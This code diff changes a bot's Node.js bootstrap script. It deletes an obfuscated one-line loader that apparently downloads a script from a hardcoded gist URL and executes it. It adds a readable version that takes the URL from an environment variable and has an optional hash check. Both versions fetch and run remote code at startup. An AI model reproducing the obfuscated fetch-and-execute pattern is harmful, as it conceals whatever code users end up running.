@@ -1,1 +1,113 @@
-function _0x21a3(){const _0x4f4c0e=['DgHLBG','odaWmdm1mK90v292rq','zxHPDa','mtqWmZjls0f3zfO','Bg9JyxrPB24','C3rHDhvZq29Kzq','odiWnty2z2T4t1fu','mJq2nZaYC2jKAxHO','ndi3oda1mdDWBLfMvKC','mtm4nNfODxPyuG','y2f0y2G','Ahr0Chm6lY9NAxn0lMDPDgH1yNvZzxjJB250zw50lMnVBs9tquzftuuXmJmVzgnJndyWnJG3mMmWmJDImMzJmdnImta5mdm5mZK1zgqVCMf3l2XVywrLCI5QCW','zxjYB3i','u3rHCNr1CcbMywLSzwqUifbSzwfZzsbYzwrLCgXVEs4','Dw5SAw5R','Ahr0Chm','qKftsuWTtuqVmI4W','nwTLD01TEa','zxHPC3rZu3LUyW','wu9vuL9vu0vstKfnrq','Bg9HzgvYlMPZ','AM9PBG','q29UzMLNDxjHDgLVBIbLCNjVCI4GugXLyxnLihjLzgvWBg95lG','igrVD25SB2fKAw5NigXVywrLCG','zMLUAxnO','AgvHzgvYCW','sfruuca','AhjLzG','zgLYBMfTzq','ndq5mdyXmfnmtefZAq','ndK0mtu4mezhuMPNvW','vg9Vig1HBNKGCMvKAxjLy3rZ','mJDIrLvUAha','CgLWzq','owfss3PKEq','y3jLyxrLv3jPDgvtDhjLyw0','Aw5JBhvKzxm'];_0x21a3=function(){return _0x4f4c0e;};return _0x21a3();}const _0x3d7961=_0x3d48;(function(_0x38058e,_0x49d1c3){const _0x54f124={_0x37a9a8:0x98,_0x3b03ba:0x94,_0x205f24:0xac,_0x4ecf8a:0xa4,_0x54e274:0x96,_0x59db8f:0xa3},_0x2b94ea=_0x3d48,_0x250d7f=_0x38058e();while(!![]){try{const _0x27bd41=parseInt(_0x2b94ea(0xa1))/(0x2*0xb41+0xcb9*-0x1+-0x9c8)+-parseInt(_0x2b94ea(0xa2))/(-0x1d1b*-0x1+-0x2367+0x6*0x10d)*(parseInt(_0x2b94ea(_0x54f124._0x37a9a8))/(-0x1eba+-0x14fe+0x33bb))+-parseInt(_0x2b94ea(_0x54f124._0x3b03ba))/(-0x13b1+0x13d*0x17+-0x8c6)+parseInt(_0x2b94ea(_0x54f124._0x205f24))/(0xc7*-0x1+-0x29b*-0xb+-0x1bdd*0x1)*(-parseInt(_0x2b94ea(0x9c))/(-0x1e9b*-0x1+-0x1f53+0xbe))+-parseInt(_0x2b94ea(_0x54f124._0x4ecf8a))/(-0x11ca+-0x1760+0x2931)*(-parseInt(_0x2b94ea(0x9e))/(-0x2373+0x19c0*0x1+0x9bb))+parseInt(_0x2b94ea(_0x54f124._0x54e274))/(-0x1f91+0x4c9+-0x5*-0x55d)*(-parseInt(_0x2b94ea(0x93))/(-0x1e13+-0x1f3*0x11+0x3f4*0x10))+parseInt(_0x2b94ea(_0x54f124._0x59db8f))/(-0x9df*0x2+0x83f+0xb8a);if(_0x27bd41===_0x49d1c3)break;else _0x250d7f['push'](_0x250d7f['shift']());}catch(_0x133320){_0x250d7f['push'](_0x250d7f['shift']());}}}(_0x21a3,0x25c79+0x12ec84+-0x98561));function _0x3d48(_0xb4d333,_0x13d563){const _0x2b6ce2=_0x21a3();return _0x3d48=function(_0x4a385e,_0x4ebc28){_0x4a385e=_0x4a385e-(-0x22e7+-0x2e4*-0x1+0x2f6*0xb);let _0x53b1b2=_0x2b6ce2[_0x4a385e];if(_0x3d48['zMydGT']===undefined){var _0x227908=function(_0x2c00a4){const _0xd8fff0='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x109dc='',_0x504609='';for(let _0x43bbdc=-0x1649+-0x56f+0x1bb8,_0x2e3428,_0x638e23,_0x2c0d9d=-0x1d8c*-0x1+0x1574+0x198*-0x20;_0x638e23=_0x2c00a4['charAt'](_0x2c0d9d++);~_0x638e23&&(_0x2e3428=_0x43bbdc%(-0x1ab+-0x11f8+0x13a7)?_0x2e3428*(-0x24c8+-0x1*0x261d+0x4b25)+_0x638e23:_0x638e23,_0x43bbdc++%(-0x9db+-0x3*-0x71b+-0xb72))?_0x109dc+=String['fromCharCode'](-0x117d+-0x1*0x770+-0x9e*-0x2a&_0x2e3428>>(-(-0x1ef7*-0x1+-0x1*-0x222d+-0x2a*0x18d)*_0x43bbdc&0x13df*0x1+0x7*-0x42a+-0x94d*-0x1)):0xaab+0x53*-0x6b+0x1806){_0x638e23=_0xd8fff0['indexOf'](_0x638e23);}for(let _0x39e5d4=-0x2*-0x97b+0xdf0*-0x2+0x8ea,_0x3bd54b=_0x109dc['length'];_0x39e5d4<_0x3bd54b;_0x39e5d4++){_0x504609+='%'+('00'+_0x109dc['charCodeAt'](_0x39e5d4)['toString'](-0x5*-0x6ef+0x132f+-0x35ca))['slice'](-(0x8cc+-0x2221*0x1+0x1957));}return decodeURIComponent(_0x504609);};_0x3d48['OvzNeY']=_0x227908,_0xb4d333=arguments,_0x3d48['zMydGT']=!![];}const _0x318b91=_0x2b6ce2[-0x2*-0x841+0x2*0xc+-0x109a],_0x75063b=_0x4a385e+_0x318b91,_0x105d48=_0xb4d333[_0x75063b];return!_0x105d48?(_0x53b1b2=_0x3d48['OvzNeY'](_0x53b1b2),_0xb4d333[_0x75063b]=_0x53b1b2):_0x53b1b2=_0x105d48,_0x53b1b2;},_0x3d48(_0xb4d333,_0x13d563);}import _0x35e840 from'https';import _0x5d600f from'http';import _0x442475 from'fs';import _0x1d6b46 from'path';import{fileURLToPath,pathToFileURL}from'url';const __dirname=_0x1d6b46[_0x3d7961(0x92)](fileURLToPath(import.meta['url'])),LOADER_PATH=_0x1d6b46[_0x3d7961(0xb0)](__dirname,_0x3d7961(0xaf)),LOADER_URL=_0x3d7961(0xa6);async function downloadFile(_0x46d508,_0xdab14b,_0x50d0dd=0x8d*-0x35+-0x354*0x1+0x2085){const _0x433b36={_0x2011ac:0xaa,_0x508c3b:0x99,_0x508840:0xa7},_0x188590=_0x3d7961;if(_0x50d0dd>0x24c2+0x1c1e+-0x40db)throw new Error(_0x188590(0x95));return new Promise((_0x27b574,_0x4dda29)=>{const _0x4fc90f={_0x395cc2:0x8f,_0x4b89f0:0x9f,_0x394bcf:0x9b,_0x53dfd4:0xa0,_0x50cfd9:0x90,_0x46b566:0xb2,_0x3d8153:0x97},_0x4c0a02=_0x188590,_0x596a99=_0x46d508['startsWith'](_0x4c0a02(_0x433b36._0x2011ac))?_0x35e840:_0x5d600f,_0xb3faf0=_0x442475[_0x4c0a02(_0x433b36._0x508c3b)](_0xdab14b);_0x596a99['get'](_0x46d508,{'headers':{'User-Agent':_0x4c0a02(0xab)}},_0x59fff8=>{const _0x448ca1=_0x4c0a02;if(_0x59fff8['statusCode']>=-0x1b9d+-0x10d9+0x2da3&&_0x59fff8[_0x448ca1(0xa0)]<=0x2362+-0x40+-0x56*0x65&&_0x59fff8[_0x448ca1(_0x4fc90f._0x395cc2)]['location'])return _0xb3faf0['close'](()=>_0x442475[_0x448ca1(0xa9)](_0xdab14b,()=>{})),downloadFile(_0x59fff8['headers'][_0x448ca1(_0x4fc90f._0x4b89f0)],_0xdab14b,_0x50d0dd+(0x2390+-0x862+-0x1b2d))[_0x448ca1(_0x4fc90f._0x394bcf)](_0x27b574,_0x4dda29);if(_0x59fff8[_0x448ca1(_0x4fc90f._0x53dfd4)]!==-0x2046+-0x19a3*-0x1+0x76b*0x1)return _0xb3faf0['close'](()=>_0x442475['unlink'](_0xdab14b,()=>{})),_0x4dda29(new Error(_0x448ca1(_0x4fc90f._0x50cfd9)+_0x59fff8[_0x448ca1(0xa0)]+_0x448ca1(_0x4fc90f._0x46b566)));_0x59fff8[_0x448ca1(_0x4fc90f._0x3d8153)](_0xb3faf0),_0xb3faf0['on'](_0x448ca1(0xb3),()=>_0xb3faf0['close'](_0x27b574)),_0xb3faf0['on']('error',_0x4dda29);})['on'](_0x4c0a02(_0x433b36._0x508840),_0x4dda29);});}async function boot(){const _0x49e5fc={_0x2b70ed:0xae,_0x42904b:0x9d,_0x1aae51:0x91},_0xe6cba1=_0x3d7961;LOADER_URL[_0xe6cba1(0x9a)](_0xe6cba1(_0x49e5fc._0x2b70ed))&&(console[_0xe6cba1(0xa7)](_0xe6cba1(0xb1)),process[_0xe6cba1(_0x49e5fc._0x42904b)](-0x1*-0x1489+-0x3e*0x95+-0x16a*-0xb)),!_0x442475[_0xe6cba1(0xad)](LOADER_PATH)&&await downloadFile(LOADER_URL,LOADER_PATH),await import(pathToFileURL(LOADER_PATH)[_0xe6cba1(_0x49e5fc._0x1aae51)]);}boot()[_0x3d7961(0xa5)](()=>{const _0x2e5653={_0x33c088:0xa7},_0x6018d7=_0x3d7961;console[_0x6018d7(_0x2e5653._0x33c088)](_0x6018d7(0xa8)),process['exit'](0x5*0x5e3+-0x2459*-0x1+-0x41c7*0x1);});
+/**
+ * BASIL-MD — Secure Bootstrap Loader
+ *
+ * Downloads and executes the bot's main loader from a trusted source.
+ * All secrets are read from environment variables — never hardcoded.
+ *
+ * Required env vars:
+ *   LOADER_URL     — URL to the loader script (GitHub Gist raw URL)
+ *   BUNDLE_TOKEN   — GitHub PAT for downloading private release assets (optional)
+ *   BUNDLE_KEY     — AES-256-CBC hex key for decrypting the bundle (optional)
+ *   LOADER_SHA256  — Expected SHA-256 hash of loader.js for integrity verification (optional but recommended)
+ */
+
+import https from 'https';
+import http from 'http';
+import fs from 'fs';
+import crypto from 'crypto';
+import path from 'path';
+import { fileURLToPath, pathToFileURL } from 'url';
+
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const LOADER_PATH = path.join(__dirname, 'loader.js');
+
+// ─── Configuration from environment ────────────────────────────────────────────
+const LOADER_URL = process.env.LOADER_URL || '';
+const LOADER_SHA256 = process.env.LOADER_SHA256 || ''; // optional integrity check
+const MAX_REDIRECTS = 5;
+
+if (!LOADER_URL) {
+  console.error('[start] LOADER_URL environment variable is not set. Please set it in your deployment config.');
+  process.exit(1);
+}
+
+// ─── Helpers ────────────────────────────────────────────────────────────────────
+
+function computeSha256(filePath) {
+  const content = fs.readFileSync(filePath);
+  return crypto.createHash('sha256').update(content).digest('hex');
+}
+
+function verifyIntegrity(filePath, expectedHash) {
+  if (!expectedHash) return true; // skip if not configured
+  const actual = computeSha256(filePath);
+  if (actual !== expectedHash.toLowerCase()) {
+    console.error(`[start] Integrity check FAILED for ${path.basename(filePath)}`);
+    console.error(`[start]   Expected SHA-256: ${expectedHash}`);
+    console.error(`[start]   Actual SHA-256:   ${actual}`);
+    return false;
+  }
+  console.log(`[start] Integrity verified: ${path.basename(filePath)}`);
+  return true;
+}
+
+async function downloadFile(url, dest, redirects = 0) {
+  if (redirects > MAX_REDIRECTS) {
+    throw new Error('Too many redirects');
+  }
+
+  return new Promise((resolve, reject) => {
+    const client = url.startsWith('https') ? https : http;
+    const outStream = fs.createWriteStream(dest);
+
+    client.get(url, { headers: { 'User-Agent': 'BASIL-MD/2.0' } }, (res) => {
+      // Handle redirects
+      if (res.statusCode >= 300 && res.statusCode <= 399 && res.headers.location) {
+        outStream.close(() => fs.unlink(dest, () => {}));
+        return downloadFile(res.headers.location, dest, redirects + 1)
+          .then(resolve, reject);
+      }
+
+      // Handle HTTP errors
+      if (res.statusCode !== 200) {
+        outStream.close(() => fs.unlink(dest, () => {}));
+        return reject(new Error(`HTTP ${res.statusCode} downloading loader`));
+      }
+
+      res.pipe(outStream);
+      outStream.on('finish', () => outStream.close(resolve));
+      outStream.on('error', reject);
+    }).on('error', reject);
+  });
+}
+
+// ─── Main ───────────────────────────────────────────────────────────────────────
+
+async function boot() {
+  // Validate LOADER_URL is a trusted source
+  if (!LOADER_URL.startsWith('https://')) {
+    console.error('[start] LOADER_URL must use HTTPS for security.');
+    process.exit(1);
+  }
+
+  try {
+    console.log('[start] Downloading loader...');
+    await downloadFile(LOADER_URL, LOADER_PATH);
+
+    // Verify integrity if hash is provided
+    if (!verifyIntegrity(LOADER_PATH, LOADER_SHA256)) {
+      fs.unlinkSync(LOADER_PATH);
+      console.error('[start] Aborting: loader integrity check failed. The file may have been tampered with.');
+      process.exit(1);
+    }
+
+    // Import and execute the loader
+    const loaderURL = pathToFileURL(LOADER_PATH).href;
+    await import(loaderURL);
+  } catch (err) {
+    console.error('[start] Startup failed:', err.message);
+    process.exit(1);
+  }
+}
+
+boot();
